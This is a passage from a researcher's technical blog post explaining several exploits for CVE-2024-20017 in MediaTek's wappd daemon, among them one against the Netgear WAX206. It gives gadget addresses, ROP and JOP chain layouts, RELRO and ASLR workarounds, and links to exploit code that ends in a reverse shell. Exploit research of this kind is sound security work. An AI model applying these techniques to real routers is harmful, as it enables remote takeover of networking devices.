<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">IAPP_HEX_DUMP</span><span class="p">(</span><span class="s">"kdp_info.MacAddr"</span><span class="p">,</span> <span class="n">kdp_info</span><span class="p">.</span><span class="n">MacAddr</span><span class="p">,</span> <span class="n">ETH_ALEN</span><span class="p">);</span>
  <span class="n">if_idx</span> <span class="o">=</span> <span class="n">mt_iapp_find_ifidx_by_sta_mac</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pCtrlBK</span><span class="o">-&gt;</span><span class="n">SelfFtStaTable</span><span class="p">,</span> <span class="n">kdp_info</span><span class="p">.</span><span class="n">MacAddr</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">if_idx</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">DBGPRINT</span><span class="p">(</span><span class="n">RT_DEBUG_TRACE</span><span class="p">,</span> <span class="s">"iapp&gt; %s: cannot find wifi interface</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">__FUNCTION__</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">OidReq</span><span class="o">-&gt;</span><span class="n">Len</span> <span class="o">=</span> <span class="n">BufLen</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">OID_REQ</span><span class="p">);</span>

  <span class="n">IAPP_MsgProcess</span><span class="p">(</span><span class="n">pCtrlBK</span><span class="p">,</span> <span class="n">IAPP_SET_OID_REQ</span><span class="p">,</span> <span class="n">pBufMsg</span><span class="p">,</span> <span class="n">BufLen</span><span class="p">,</span> <span class="n">if_idx</span><span class="p">);</span>

</code></pre></div></div>

<p>The most interesting of these is the assignment to <code class="language-plaintext highlighter-rouge">OidReq-&gt;Len</code> using the value in <code class="language-plaintext highlighter-rouge">BufLen</code>: the
former is an access that will dereference a pointer we can corrupt (<code class="language-plaintext highlighter-rouge">OidReq</code>), and the latter is an
access of an int32 value that we can also control (<code class="language-plaintext highlighter-rouge">BufLen</code>). In other words, we control both sides
of the assignment expression and can write an arbitrary 4-byte value to an arbitrary address.</p>

<p>So, what can we accomplish with this primitive? There are multiple strategies that might work at
this point and this is where the creativity in exploit development comes in. If our ultimate goal is
to execute <code class="language-plaintext highlighter-rouge">system()</code> to execute shell commands, weâll generally have to do the following:</p>

<ol>
  <li>Get the command string we want executed into memory at a <em>known</em> address</li>
  <li>Get the pointer to that string placed into the appropriate register to be passed as the first argument to <code class="language-plaintext highlighter-rouge">system()</code> (i.e. put into <code class="language-plaintext highlighter-rouge">rdi</code> on x86_64)</li>
  <li>Redirect execution to <code class="language-plaintext highlighter-rouge">system()</code>
</li>
</ol>

<p>The exploit linked above applies this concept to corrupt the <code class="language-plaintext highlighter-rouge">OidReq</code> pointer and uses the 4-byte
write primitive to iteratively write a shell payload into a segment of the GOT (<strong>1</strong>); as the
binary is built with no PIE and only partial RELRO, the GOT is always at a predictable address and
writeable, so we can use it as a buffer for our payload. The only constraint on this is that we must
avoid overwriting GOT entries for functions that will get called somewhere along the execution path
to the vulnerable code, as this would result in a crash before the exploit has finished. The exploit
sends multiple corruption payloads to write the shell command, adjusting the corrupted <code class="language-plaintext highlighter-rouge">OidReq</code>
pointer on each request by +4 bytes to turn the 4-byte write into an arbitrary write-what-where. The
exploit then uses the 4-byte write to corrupt the GOT entry of <code class="language-plaintext highlighter-rouge">read()</code> with the address of a ROP
gadget that kicks off a ROP chain to adjust the stack, pop the address of the shell payload in the
GOT into <code class="language-plaintext highlighter-rouge">$rdi</code> (<strong>2</strong>), and then jumps to the call to <code class="language-plaintext highlighter-rouge">system()</code> (<strong>3</strong>) located in
<code class="language-plaintext highlighter-rouge">IAPP_PID_Kill()</code> to have the shell payload executed. <code class="language-plaintext highlighter-rouge">read()</code> was chosen as the GOT entry to
corrupt to redirect execution as itâs not in the execution path of the vulnerable code and we can
trigger it on-demand by sending a request over TCP since the handler for TCP connections uses
<code class="language-plaintext highlighter-rouge">read()</code> rather than <code class="language-plaintext highlighter-rouge">recvfrom()</code>; all of the earlier payloads are sent over UDP.</p>

<p>One important bit in the way this exploit works is that the redirection of execution happens async
from the payload that caused the corruption â itâs only triggered when we send the final TCP
request to causes the corrupted GOT entry for <code class="language-plaintext highlighter-rouge">read()</code> to be called, which means none of our
controlled data is at the top of the stack and none of the data we send in the TCP packet is ever
actually read (since <code class="language-plaintext highlighter-rouge">read()</code> is gone). This is a problem since we need to have controlled values at
the top of the stack after the first ROP gadget returns so that we can retain control of execution.
This is where a bit of luck comes in â in this case, weâre able to find some of the payload data
from the earlier requests that were sent about 40 bytes below the top of the stack frame (the stack
isnât cleared between functions/uses), so weâre able to reach the payload data by popping 5 values
from the stack before doing anything else.</p>

<p>This exploit avoids corrupting the stack metadata at all, so stack canaries donât come into play. It also
only makes use of predictable addresses and ROP to avoid dealing with ASLR, so no leak is needed.</p>

<p><img src="/assets/images/mtk-wapp-exploit2.png" alt="mtk-wapp-exploit2.png"></p>

<hr>

<h2 id="exploit-3-return-address-corruption--arbitrary-write-via-rop-full-relro">
<a class="anchor" href="#exploit-3-return-address-corruption--arbitrary-write-via-rop-full-relro" aria-hidden="true"><span class="octicon octicon-link"></span></a>exploit 3: return address corruption + arbitrary write via ROP (full RELRO)</h2>

<ul>
  <li>Build: x86_64, optimization level 2, forking daemon</li>
  <li>Mitigations: ASLR, full RELRO, NX</li>
  <li><a href="https://github.com/mellow-hype/cve-2024-20017/blob/main/x86_64/x86_64_full_relro.py" target="_blank">Exploit code</a></li>
</ul>

<p>So, the last exploit was able to get around the stack canaries and ASLR by using pointer corruption
to get an arbitrary write primitive, which was needed to allow us to write controlled values into
the GOT so that we would know the address of that data for use later in the exploit. But what if
that there wasnât a pointer nearby for us to corrupt to get that arbitrary write? Well, it turns out
that if the application is built with optimization level set to 2 (<code class="language-plaintext highlighter-rouge">-O2</code>), various functions along
the execution path to the vulnerable code get inlined into one big function running within the scope
of <code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code>, resulting in changes to the stack layout and ordering of variables. This
ends up making it impossible to corrupt the <code class="language-plaintext highlighter-rouge">OidReq</code> pointer that we previously relied on for the
arbitrary write, so another approach must be found.</p>

<p>Since we lost the write primitive we used in the previous exploit, weâll disable stack canaries on
this version to give us a code redirection primitive to start with (we need to have <em>something</em> to
start with). This example is meant to demonstrate a way of getting an arbitrary write primitive from
a code exec primitive, as itâs not usually enough to be able to <em>just</em> redirect execution, so having
both will always make things much easier. To keep things interesting, weâll enable full RELRO so
that the GOT and PLT sections are no longer writeable.</p>

<h3 id="arbitrary-write-via-rop">arbitrary write via ROP</h3>

<p>The first thing we need to do given the new restrictions is find a way to get an arbitrary write
primitive to allow us to write our command payload at a predictable address. Since we can influence
the flow of execution, our best bet is going to be to use ROP to get it. As with any exploit that
relies on ROP, thereâs a certain amount of luck involved in that the binary your exploit is written
against needs to contain the required ROP gadgets within the main executable (shared objs will be
affected by ASLR).</p>

<p>If we think about how the previous r/w primitive worked, there was a pointer value being
dereferenced and a value assigned (i.e. written) to the memory it pointed to. What would this look
like in assembly? Probably something like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	mov rax, [rsp+0x30];     # read a value from some address into $rax
	mov [rax], rbx;          # write the value of $rbx to the address pointed to by the value in $rax (deref $rax as pointer)
</code></pre></div></div>

<p>So, if we can find a gadget (or gadgets) that will allow us to do this kind of operation and we can
control the values that are used for both sides of the operation, we should be able to get an
arbitrary write primitive. And, it turns out, luck is on our side! The gadget below (<code class="language-plaintext highlighter-rouge">GADGET_A</code>) is
available:</p>

<p><strong>GADGET_A</strong></p>
<ul>
  <li>
<code class="language-plaintext highlighter-rouge">0x405574</code>:
    <ul>
      <li>
<code class="language-plaintext highlighter-rouge">mov rdx, QWORD PTR [rsp+0x50];</code>: read a value at <code class="language-plaintext highlighter-rouge">$rsp+0x50</code> (top of stack+80) into <code class="language-plaintext highlighter-rouge">$rdx</code>
</li>
      <li>
<code class="language-plaintext highlighter-rouge">mov QWORD PTR [rdx], rax</code>: dereference <code class="language-plaintext highlighter-rouge">$rdx</code> as a pointer and write the value in <code class="language-plaintext highlighter-rouge">$rax</code> to that location</li>
      <li>
<code class="language-plaintext highlighter-rouge">xor eax, eax;</code>: 0 out lower 32 bits of <code class="language-plaintext highlighter-rouge">$rax</code>
</li>
      <li>
<code class="language-plaintext highlighter-rouge">add rsp; 0x48</code>: shift stack up by <code class="language-plaintext highlighter-rouge">0x48</code> bytes</li>
      <li>
<code class="language-plaintext highlighter-rouge">ret;</code>: return</li>
    </ul>
  </li>
</ul>

<p>Great! This gets us most of the way there. But first, we need to find a way to get controlled
values into <code class="language-plaintext highlighter-rouge">$rax</code> as that will be what gets written to the address in <code class="language-plaintext highlighter-rouge">$rdx</code>.  To do this, we need
to find a gadget that will take a value from the stack and put it into <code class="language-plaintext highlighter-rouge">$rax</code>, same as before. This
is usually easy enough as  <code class="language-plaintext highlighter-rouge">pop</code> operations happen all over the place and the odds are at least one
of them pops to <code class="language-plaintext highlighter-rouge">$rax</code>. This is the gadget I chose to go with for this exploit (<code class="language-plaintext highlighter-rouge">GADGET_B</code>):</p>

<p><strong>GADGET_B</strong></p>
<ul>
  <li>
<code class="language-plaintext highlighter-rouge">0x0042acd8: pop rax; add rsp, 0x18; pop rbx; pop rbp; ret;</code>
    <ul>
      <li>
<code class="language-plaintext highlighter-rouge">pop rax;</code>: pop the value at the top of the stack into <code class="language-plaintext highlighter-rouge">$rax</code>
</li>
      <li>
<code class="language-plaintext highlighter-rouge">add rsp, 0x18;</code>: increment <code class="language-plaintext highlighter-rouge">$rsp</code> by <code class="language-plaintext highlighter-rouge">0x18 (24)</code> bytes; will need +24 bytes of padding to account for this operation</li>
      <li>
<code class="language-plaintext highlighter-rouge">pop rbx; pop rbp;</code>: pop the next two values from the (new) top of the stack into <code class="language-plaintext highlighter-rouge">$rbx</code> and <code class="language-plaintext highlighter-rouge">$rbp</code>, respectively; will need +16 bytes of padding to account for this operation</li>
      <li>
<code class="language-plaintext highlighter-rouge">ret;</code>: return</li>
    </ul>
  </li>
</ul>

<p>Chaining the second gadget with the first one gets us everything we need! We can now write an
arbitrary 8-byte value to an arbitrary address, assuming we control the values at the top of the
stack when execution is redirected (which we will since we corrupt the saved return address, which
is at the top of the stack). Hereâs what the payload for this chain would look like, including the
padding needed to account for the instructions that modify the stack pointer.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GADGET_B
value_to_write ; popped into rax
padding[40]    ; account for 2 pops and a +0x18 shift to rsp
GADGET_A       ; value jumped to after ret from GADGET_B; read $rsp+50 into rdx
padding[72]    ; account for rsp+0x48
&lt;next_jump_addr&gt; ; addr jumped to after ret from GADGET_A
addr_to_write_to ; value read into $rdx in the start of GADGET_A
</code></pre></div></div>

<p>Similar to the previous exploit, this ROP chain can be inserted multiple times to write more than 8
bytes starting at a target address, but in order to do this, thereâs one more gadget that is needed
to deal with a minor nuance in how <code class="language-plaintext highlighter-rouge">GADGET_A</code> interacts with the stack.</p>

<p>The first gadget we discuss above (<code class="language-plaintext highlighter-rouge">GADGET_A</code>) pops the value at <code class="language-plaintext highlighter-rouge">$rsp+0x50</code> into <code class="language-plaintext highlighter-rouge">$rdx</code>, so our
payload needs to place the address we want to write to at a <code class="language-plaintext highlighter-rouge">+0x50</code> byte offset from where this
gadget is in the payload. It then shifts the stack up by <code class="language-plaintext highlighter-rouge">+0x48</code>, leaving the stack pointer pointing
to the value right <em>before</em> the value we use as the write destination. This means the address of the
next gadget needs to be placed at <code class="language-plaintext highlighter-rouge">+0x48</code> so that it will be used when <code class="language-plaintext highlighter-rouge">ret</code> is reached; if we want
to perform <em>another</em> write, this would be the address for <code class="language-plaintext highlighter-rouge">GADGET_B</code>, and this is where the issue
comes up. After jumping to <code class="language-plaintext highlighter-rouge">GADGET_B</code>, it will pop the next value from the top of the stack
(<code class="language-plaintext highlighter-rouge">[$rsp]</code>) into <code class="language-plaintext highlighter-rouge">$rax</code>, but since <code class="language-plaintext highlighter-rouge">GADGET_A</code> shifted the stack pointer by <code class="language-plaintext highlighter-rouge">+0x48</code>, when the <code class="language-plaintext highlighter-rouge">ret</code> is
reached in <code class="language-plaintext highlighter-rouge">GADGET_A</code> the value of <code class="language-plaintext highlighter-rouge">$rsp</code> is incremented by 8 and left pointing to offset <code class="language-plaintext highlighter-rouge">+0x50</code>
(the value we pass as the write destination), and this is the value that <code class="language-plaintext highlighter-rouge">GADGET_B</code> would end up
popping into <code class="language-plaintext highlighter-rouge">$rax</code>. Thatâs not what we want, but thankfully thereâs a simple way to solve this
problem: instead of jumping directly to <code class="language-plaintext highlighter-rouge">GADGET_B</code> at the end of the first chain, we jump to another
gadget that will pop a single value from the stack (thereby incrementing <code class="language-plaintext highlighter-rouge">$rsp</code>  to <code class="language-plaintext highlighter-rouge">+0x58</code>) and
weâll place the address to <code class="language-plaintext highlighter-rouge">GADGET_B</code> there so that we jump to it when this gadget returns.</p>

<p>So, taking that into account, this is how the <code class="language-plaintext highlighter-rouge">GADGET_B+GADGET_A</code> sub-chain(?) would be chained
multiple times:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;GADGET_B
value_to_write     ; popped into rax
padding[40]        ; account for 2 pops and a +0x18 shift to rsp
&gt;GADGET_A          ; value jumped to after ret from GADGET_B; read $rsp+50 into rdx
padding[72]        ; account for rsp+0x48
&gt;POP_RET_GADGET    ; addr jumped to after ret from GADGET_A; pop-ret so GADGET_B 8 bytes up is next ret address and not addr_to_write_to
addr_to_write_to   ; value read into $rdx in the start of GADGET_A;
--
&gt;GADGET_B
value_to_write     ; popped into rax
padding[40]        ; account for 2 pops and a +0x18 shift to rsp
&gt;GADGET_A          ; value jumped to after ret from GADGET_B; read $rsp+50 into rdx
padding[72]        ; account for rsp+0x48
&gt;POP_RET_GADGET    ; addr jumped to after ret from GADGET_A; pop-ret so GADGET_B 8 bytes up is next ret address and not addr_to_write_to
addr_to_write_to   ; value read into $rdx in the start of GADGET_A
--
...
--
&gt;GADGET_B
value_to_write
padding[40]
&gt;GADGET_A
padding[72]
&gt;FINAL_JUMP_DEST   ; addr jumped to after arbitrary write is done
addr_to_write_to
</code></pre></div></div>

<p>If this last part was hard to follow, donât worry about it (it was also hard to write). The
important part is that rather than jumping directly back to <code class="language-plaintext highlighter-rouge">GADGET_B</code> when linking multiple
instances of the chain, we instead jump to a gadget that will pop a value from the stack and then
return to jump to <code class="language-plaintext highlighter-rouge">GADGET_B</code> . This is done to ensure the values in the payload are properly
adjusted between iterations through the chain.</p>

<h3 id="dealing-with-full-relro">dealing with full RELRO</h3>

<p>Having acquired the write primitive we needed, we can use the same strategy as the previous exploit
to write our shell payload at a predictable address, with a slight modification. As we can no longer
write into the GOT or PLT segments due to full RELRO, we instead write the shell command passed to
<code class="language-plaintext highlighter-rouge">system()</code> in the only remaining writeable segments that have static/predictable addresses (assuming
no PIE) â the .bss and .data segments. Once thatâs done, the exploit jumps to a final ROP chain
that places the address where we wrote the command into <code class="language-plaintext highlighter-rouge">$rdi</code> and jumps to <code class="language-plaintext highlighter-rouge">system()</code> via the GOT
symbol so we donât need to leak the libc address.</p>

<p>We get command execution and use it to pop a reverse shell.</p>

<p><img src="/assets/images/mtk-wapp-exploit3.png" alt="mtk-wapp-exploit3.png"></p>

<hr>

<h2 id="exploit-4-wax206-return-address-corruption--arbitrary-rw-via-pointer-corruption">
<a class="anchor" href="#exploit-4-wax206-return-address-corruption--arbitrary-rw-via-pointer-corruption" aria-hidden="true"><span class="octicon octicon-link"></span></a>exploit 4: WAX206 return address corruption + arbitrary r/w via pointer corruption</h2>

<ul>
  <li>Build: aarch64, build shipped with Netgear WAX206</li>
  <li>Mitigations: full RELRO, ASLR, NX, stack canaries*</li>
  <li><a href="https://github.com/mellow-hype/cve-2024-20017/blob/main/WAX206-aarch64/wax-rip-system-rop.py" target="_blank">Exploit code</a></li>
</ul>

<p>Weâve made it to the final exploit! For this one weâre going to switch things up a bit and move on
to a real-world target: the version of wappd shipped on the <a href="https://www.netgear.com/support/product/wax206/" target="_blank">Netgear
WAX206</a>. This version is compiled for aarch64 and
has ASLR, NX, full RELRO, and stack cookies enabled. I think it offers some valuable insight into
the differences between writing exploits in controlled environments vs. writing them against
real-world targets â things often change in important ways that force you to adapt.</p>

<h3 id="the-story">the story</h3>

<p>Iâm going to switch up the writing style for this section and use more of a narrative
format so that I can provide some context by walking through the process of how I figured everything
out. This exploit was a bit of a challenge to figure out and I think the process is best told as a
story. After that weâll switch back to the style used in the preceding sections.</p>

<p><em>DISCLAIMER: This is the first time Iâve written this kind of exploit for an arm64 target and I had
to learn a lot of the stuff mentioned below along the way. For this reason, you should take the
details with a grain of salt as theyâre my current understanding of how/why things worked a certain
way but they might not be 100% accurate. If you notice anything thatâs incorrect please let me
know!</em></p>

<h4 id="important-changes">important changes</h4>

<p>Iâll start this section by going over some of the important differences for
this target and the previous ones, and how that ultimately impacted the final exploit.</p>

<p>The first major change was a difference in the optimization and inlining of code in the binary.
Whether it was the result if different compiler versions, architectural differences, or something
else, Iâm ultimately not sure. But the outcome was that the layout of stack variables changed and
the ability to corrupt the <code class="language-plaintext highlighter-rouge">OidReq</code> pointer that was previously targeted was no longer viable,
similar to <strong>exploit 3</strong>. So, this meant there was no arbitrary write primitive to start with. What
about a code redirection primitive (which the previous exploit relied on to get the write
primitive)?</p>

<p>This is where the next important difference comes in: arm64âs way of handling function returns. In
arm64, the return address is usually expected to be in the <code class="language-plaintext highlighter-rouge">x30</code> register and it will only be pushed
onto the stack for nested function calls that will need to overwrite it. I learned this the hard way
when I attached to the process with GDB and could see my target jump address correctly placed on the
stack to be used on the next returnâ¦and then saw it go completely ignored when the function hit
the final <code class="language-plaintext highlighter-rouge">ret</code> and used the value in <code class="language-plaintext highlighter-rouge">x30</code> without touching the stack. The inlining mentioned above
resulted in various function calls along the path of the vulnerable code getting inlined into one
massive function, eliminating basically every opportunity to corrupt a return address on the stack
which would be used in a <code class="language-plaintext highlighter-rouge">ret</code> (inlined functions donât <code class="language-plaintext highlighter-rouge">ret</code>). To top it all off, the <em>only</em> stack
frame that did have a saved return address that could be corrupted and that would actually be used
was for the main request processing loop â which runs infinitely and wonât return unless a SIGTERM
signal is caught (weâll come back to this shortly). There is a ton of nuance for each of these
changes and their effect on the final exploit, but tl;dr, this meant needing to go back to the
drawing board to come up with a new exploit strategy.</p>

<p>The <em>one</em> piece of good news was that even though <code class="language-plaintext highlighter-rouge">checksec</code> reports that the binary has stack
canaries enabled, analyzing it in Binja showed that the cookie-checking logic inserted by the
compiler was only present in two functions, and those were from an external library. This meant that
I wouldnât actually have to worry about stack cookies at all! Too bad corrupting saved return
addresses seems to be out of the question given the conditions described in the previous
paragraphâ¦</p>

<h4 id="arbitrary-write-via-ppktbuf-pointer-corruption">arbitrary write via pPktBuf pointer corruption</h4>

<p>Based on the way Iâd approached the previous exploits, I figured there had to be a way to corrupt a
pointer somewhere so thatâs what I tackled first. After spending a bit of time doing some debugging
live on the WAX206 and testing different payloads, I eventually found that I could overwrite three
of the pointers defined in <code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code>: <code class="language-plaintext highlighter-rouge">pPktBuf</code>, <code class="language-plaintext highlighter-rouge">pCmdBuf</code>, and <code class="language-plaintext highlighter-rouge">pRspBuf</code>. The first of
these, <code class="language-plaintext highlighter-rouge">pPktBuf</code>, points to the buffer that is used to store the inbound request data read from the
network â corrupting this pointer allows us to point it to an arbitrary location and then have the
entire contents of a subsequent request (up to 1600 bytes) written to that location. Great!</p>

<p>Interestingly, it was the effects of the inlining and arm64 semantics mentioned above that made it
possible to reach these pointers at all â under normal circumstances, writing far enough to reach
them would result in corrupting the stack frames for both <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerSSB()</code> and
<code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerUdp()</code>, and cause a premature crash before the corrupted pointers could be used
again. In this case, <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerUdp()</code> is inlined directly into <code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code> (so no
return address is used) and <code class="language-plaintext highlighter-rouge">IAPP_RcvHandlerSSB()</code> is able to get through itâs execution without
having to push/pop itâs return address value onto the stack where it could be corrupted.</p>

<p>So, I now had a write primitive of up to 1600 bytes to a controllable location. That should be
enough to get over the finish line, right?</p>

<h4 id="when-arbitrary-write-isnt-enough">when arbitrary write isnât enough</h4>

<p>What exploit strategies are viable to achieve code execution when starting with only an arbitrary
write? Taking into account the mitigations present (namely ASLR) and assuming no leak is available,
thereâs really only one option in this case: corrupt some data <em>located at a predictable/known
address</em>  which will either result in code execution directly (e.g. overwriting a function pointer)
or create conditions that will result in additional corruption that can be leveraged to take control
of execution. So, here we return to the concept discussed in <strong>exploit 2</strong>: finding corruptable data
that will be used by the application in a way that can be exploited.</p>

<p>Iâll save you the time (and frustration) of going over every possible avenue I went down looking for
this next piece and just tell you now: there was <em>nothing</em>. While there were multiple global
structures filled with function pointers, none of them are used within the request processing loop.
The data portions of some other data structures with viable targets also are unused. Full RELRO
means corrupting GOT/PLT entries is also out. And this brings us the main point here: sometimes even
arbitrary write primitives will <em>not be enough</em> to gain code execution. Iâm of the mind that itâs
always a good idea to follow every thread and try every possible angle during exploit dev, but the
reality is that sometimes, there just isnât any. Valid vulnerabilities that are exploitable in one
environment will not always be exploitable in another; everything matters. Which is why I also
follow the motto âexploit or GTFOâ â unless impact has been shown against the real target with a
real exploit, little can be said about the <em>real-world impact</em> of a vulnerability.</p>

<h4 id="accepting-defeat-the-exploit-will-only-work-on-termination">accepting defeat: the exploit will only work on termination</h4>

<p>As mentioned in the <strong>important changes</strong> section, there was <em>one</em> return address that could be
corrupted: the one for <code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code>. The issue was that this function only returns on process
termination when a SIGTERM is caught and handled. Iâd initially ignored this since thereâs no way to
force this termination as a remote attacker but, having hit a dead-end on finding another execution
primitive, I had to accept defeat and just decided to write the exploit with the assumption that the
process would terminate and hit the corrupted return address. The end of this post would be pretty
anticlimactic if I just stopped here, right?</p>

<h3 id="final-exploit-overview">final exploit overview</h3>

<p>Having gone over all of the important bits of the process that eventually led to the final exploit,
weâll now switch back to the present and talk about how the exploit works. Given that this post is
already pretty long, Iâll avoid going over <em>every</em> detail of how the final exploit came together and
instead focus on the parts that I think are most interesting or important (feel free to reach out on
twitter if you have any follow up questions). This one reuses a few of the concepts that were
covered in previous exploits, including using pointer corruption to get a write primitive, using the
.bss/.data segment as a buffer for the main payload, and leveraging ROP (technical JOP, in this
case) to set up the arguments for calling <code class="language-plaintext highlighter-rouge">system()</code> to get command execution.</p>

<p>To summarize where weâre starting from:</p>
<ul>
  <li>We have an arbitrary write primitive of up to 1600 bytes via corruption of the <code class="language-plaintext highlighter-rouge">pPktBuf</code> pointer</li>
  <li>We have a way to redirect code execution via corruption of the saved return address in the stack frame for <code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code> (but this will only be triggered when the process receives a SIGTERM signal)</li>
</ul>

<p>The exploit is split up into two requests: one that corrupts the <code class="language-plaintext highlighter-rouge">pPktBuf</code> pointer to set up the
write primitive and another that uses the write primitive to write the shell payload and some other
data into a known memory region for later use.</p>

<p>The first one is pretty straightforward as all that really needs to be done is send a payload large
enough to overflow up to the <code class="language-plaintext highlighter-rouge">pPktBuf</code> pointer and make it point to the start of the .bss segment in
memory. As this pointer is used to store incoming request data, the contents of the <em>next</em> request
we send will be written to that address. Apart from corrupting this pointer, the first payload also
corrupts the <code class="language-plaintext highlighter-rouge">pCmdBuf</code> pointer, which is used to store data parsed out of the packet we send. As
such, <code class="language-plaintext highlighter-rouge">pCmdBuf</code> needs to point to a writeable segment of memory to avoid crashing or prematurely
aborting, so we overwrite it to also point to an offset into the .bss, but far enough to ensure it
wonât affect the payload sent in the second request.</p>

<p>The second request is where the real action happens. Having set up the write primitive with the
first request, this new payload needs to accomplish the following:</p>

<ol>
  <li>Write our shell command to a location we can reference when we call <code class="language-plaintext highlighter-rouge">system()</code>
</li>
  <li>Corrupt the saved return address to redirect code execution to a ROP gadget used to set up the argument to <code class="language-plaintext highlighter-rouge">system()</code>
    <ul>
      <li>ROP/JOP gadget does:
        <ul>
          <li>moves values in <code class="language-plaintext highlighter-rouge">x24</code> to <code class="language-plaintext highlighter-rouge">x0</code> (<code class="language-plaintext highlighter-rouge">x0</code> is used to pass first arg to the called function)</li>
          <li>jumps to the value in <code class="language-plaintext highlighter-rouge">x22</code>
</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Provide the address to <code class="language-plaintext highlighter-rouge">system()</code> and the address of the shell command from step 1 so they can be used by the ROP gadget. These values will be loaded in registers when the corrupted return address is used and exec jumps to the ROP gadget.
    <ul>
      <li>address where shell command string was written -&gt; loaded into x0</li>
      <li>address of <code class="language-plaintext highlighter-rouge">system().plt</code> -&gt; loaded into x22</li>
    </ul>
  </li>
  <li>Corrupt the <code class="language-plaintext highlighter-rouge">pPktBuf</code>, <code class="language-plaintext highlighter-rouge">pCmdBuf</code>, and <code class="language-plaintext highlighter-rouge">pRspBuf</code> pointers to set them to NULL to avoid triggering libc malloc sanity checks when these pointers are freeâd in <code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code> during termination</li>
  <li>Redirect execution to <code class="language-plaintext highlighter-rouge">system()</code> after having set up the argument (i.e. the address to the shell command written in step 1)</li>
</ol>

<p>The first two steps are pretty simple. We write the shell command we want executed right at the
start of the payload; since weâve corrupted <code class="language-plaintext highlighter-rouge">pPktBuf</code> to point to a known location and thatâs where
this second payload will be written, we can predict where this string will be located. In this case,
as <code class="language-plaintext highlighter-rouge">pPktBuf</code> has been set to the start of the .bss segment, the command string will be located 16
bytes into the .bss segment (to account for the packet header and other fields of the SB packet
struct). For step two, we know the offset into the overflow where the saved return address for
<code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code> is located, so we simply overwrite that location with the address of the ROP
gadget weâll use to set up arguments and redirect execution to <code class="language-plaintext highlighter-rouge">system()</code>.</p>

<p>Letâs take a moment to talk about that ROP gadget and ROP in general on arm64 vs. x86.  As mentioned
before, the return semantics are different in arm64 vs x86, which means the gadgets work a little
differently. In particular, ROP gadgets in arm64 donât just need to end in a <code class="language-plaintext highlighter-rouge">ret</code> in order to be
useful; they have to end with the correct stack operation to pop the next value on the stack into
<code class="language-plaintext highlighter-rouge">x30</code> before executing the <code class="language-plaintext highlighter-rouge">ret</code>.  This combined with the fact that arm64 has many more general
purpose registers vs. x86 means that the likelihood of finding gadgets that make use of registers
you can control and that <em>also</em> properly set up for the <code class="language-plaintext highlighter-rouge">ret</code> is much lower vs. x86, where there are
only a handful of registers that are used and whatever is next on the stack is used automatically on
<code class="language-plaintext highlighter-rouge">ret</code>.</p>

<p>Anyway, the gadget used in the final exploit is technically a JOP (Jump Oriented Programming) gadget
so we avoid the issue with <code class="language-plaintext highlighter-rouge">ret</code> entirely. Rather than using <code class="language-plaintext highlighter-rouge">ret</code> to redirect execution, JOP
gadgets jump directly to a value stored in a register. We get lucky in that weâre able to control a
handful of registers at the time when execution is redirected to the gadget. Two of those registers
are <code class="language-plaintext highlighter-rouge">x22</code> and <code class="language-plaintext highlighter-rouge">x24</code>, so weâre able to use the following gadget, which simply moves the value in
<code class="language-plaintext highlighter-rouge">x24</code> to <code class="language-plaintext highlighter-rouge">x0</code> (the register used to pass the first arg to a function) and then jumps to the address
in <code class="language-plaintext highlighter-rouge">x22</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov x0, x24;   # we'll put the addr of the shell command string in x24
blr x22;       # and the address of `system()` in x22
</code></pre></div></div>

<p>Going back to the remainder of the exploit, the only other thing that needs to be done is corrupt
the <code class="language-plaintext highlighter-rouge">pPktBuf</code>, <code class="language-plaintext highlighter-rouge">pCmdBuf</code>, and <code class="language-plaintext highlighter-rouge">pRspBuf</code> pointers to set them each to NULL. We do this because at the
end of <code class="language-plaintext highlighter-rouge">IAPP_RcvHandler()</code>, prior to returning and using our corrupted return address, these
pointers will be passed to <code class="language-plaintext highlighter-rouge">free()</code> if theyâre not NULL. If theyâre still pointing to the previous
locations we set them to, weâll end up triggering libc mallocâs sanity checks and trigger an
<code class="language-plaintext highlighter-rouge">abort()</code> before weâre able to redirect execution.</p>

<p>With all of that in place, we arrive at the Promised Land:</p>

<p><img src="/assets/images/mtk-wapp-exploit-wax206.png" alt="mtk-wapp-exploit-wax206.png"></p>

<h2 id="bonus-triggering-a-kernel-bug-by-performing-arbitrary-ioctl-calls-via-jop">
<a class="anchor" href="#bonus-triggering-a-kernel-bug-by-performing-arbitrary-ioctl-calls-via-jop" aria-hidden="true"><span class="octicon octicon-link"></span></a>bonus: triggering a kernel bug by performing arbitrary IOCTL calls via JOP</h2>

<p>As a final bonus, what if you could write one exploit for two completely separate vulns? Like if
there happened to be a bug in a kernel driver that could only be reached locally and a separate bug
in a network service that could be exploited remotelyâ¦? Well, you might have to do some wacky
stuff like use a JOP chain to open a new socket, construct an <code class="language-plaintext highlighter-rouge">iwreq</code> struct in memory to pass to
the kernel, set up arguments, and trigger a call to <code class="language-plaintext highlighter-rouge">ioctl()</code>. But if you can find a wayâ¦</p>

<p><img src="/assets/images/mtk-wapp-exploit-rop2kernel.png" alt="mtk-wapp-exploit-rop2kernel.png"></p>

<p>Why do this rather than just use the command exec to download the kernel exploit and run it? Just to
show you can ;)</p>

<h2 id="wrapping-up">
